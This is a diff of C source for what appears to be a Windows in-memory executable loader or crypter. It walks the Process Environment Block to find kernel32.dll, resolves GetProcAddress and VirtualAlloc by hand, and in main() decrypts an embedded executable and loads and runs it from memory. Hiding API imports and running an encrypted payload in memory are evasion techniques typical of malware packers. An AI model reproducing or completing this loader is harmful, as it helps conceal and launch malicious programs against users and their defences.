@@ -36,10 +36,12 @@ int compare_file_name(const wchar_t *path, const wchar_t *name){
     return wcs_equals(basename, name);
 }
 
-void *resolved_library_addresses[] = {NULL, NULL};
-void *resolved_function_addresses[] = {NULL, NULL};
-const wchar_t needed_library_names[] = L"KERNEL32.DLL\x00msvcrt.dll";
-const char needed_imported_function_names[] = "GetProcAddress\x00VirtualAlloc";
+PPEB peb_windows_structure = NULL;
+void *kernel_library_address = NULL;
+void *kernel_library_functions[] = {NULL, NULL};
+wchar_t kernel_library_name[] = L"kernel32.dll";
+char needed_kernel_library_functions[] = "GetProcAddress\x00VirtualAlloc";
+int number_kernel_library_functions = 2;
 
 const wchar_t *get_library_by_number(const wchar_t *buffer, int n){
     const wchar_t *current = buffer;
@@ -68,8 +70,6 @@ void *get_module_address(PPEB process_env_block, const wchar_t *module_name){
     LIST_ENTRY *current_module = linked_list_head->Flink;
     while(current_module != linked_list_head){
     	PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY) (((BYTE *) current_module) - (sizeof(PVOID) * 2));
-	printf("The next module in get_module_address is %ls\n", entry->FullDllName.Buffer);
-	printf("The %d\n", compare_file_name(entry->FullDllName.Buffer, module_name));
 	if(entry->FullDllName.Buffer != NULL && compare_file_name(entry->FullDllName.Buffer, module_name)){
 	    return entry->DllBase;
 	}
@@ -95,6 +95,15 @@ void *get_function_address(void *module_address, const char *function_name){
         }
     }
     return NULL;    
+}
+
+void init_kernel_library(void){
+    __asm__("movl %%fs:0x30, %0" : "=r"(peb_windows_structure));
+    kernel_library_address = get_module_address(peb_windows_structure, kernel_library_name);
+    for(int i = 0; i < number_kernel_library_functions; i++){
+	const char *function_name = get_function_by_number(needed_kernel_library_functions, i);
+        kernel_library_functions[i] = get_function_address(kernel_library_address, function_name);
+    }
 }
 
 // #include "crypto_interface.h"
@@ -354,28 +363,11 @@ void code_handling_execute(in_memory_pe *new_pe){
 
 // MAIN
 
-int main(void) { 
-    PPEB peb;
-    __asm__("movl %%fs:0x30, %0" : "=r"(peb));
-    printf("Address is %p of peb\n", peb);
-
-    const wchar_t *kernel_name = get_library_by_number(needed_library_names,0);
-    printf("The name of the kernel modules is %ls\n", kernel_name);
-
-    void *kernel32_base = get_module_address(peb, kernel_name);
-    
-    printf("Address of module is %p\n", kernel32_base);
-
-    const char *getprocaddress_name = get_function_by_number(needed_imported_function_names,0);
-    void *getprocaddress_base = get_function_address(kernel32_base, getprocaddress_name);
-   
-    printf("The address of kernel base is %p and the address of getprocaddress is %p\n", kernel32_base, getprocaddress_base);
-    
-    void *real_address = GetProcAddress(kernel32_base, "GetProcAddress");
-    printf("The real address of GetProcAddress is %p\n", real_address);
-    printf("The gotten address is %p\n", getprocaddress_base);
-    printf("Are they the same? %d\n", real_address == getprocaddress_base);
-
+int main(void) {    
+    init_kernel_library();
+    for(int i = 0; i < number_kernel_library_functions; i++){
+	   printf("Address %p \n", kernel_library_functions[i]);
+    } 
     decrypt_data(executable_pe, executable_size);
 
     in_memory_pe *pe_to_execute = code_handling_load_pe(executable_pe + iv_length, executable_size);
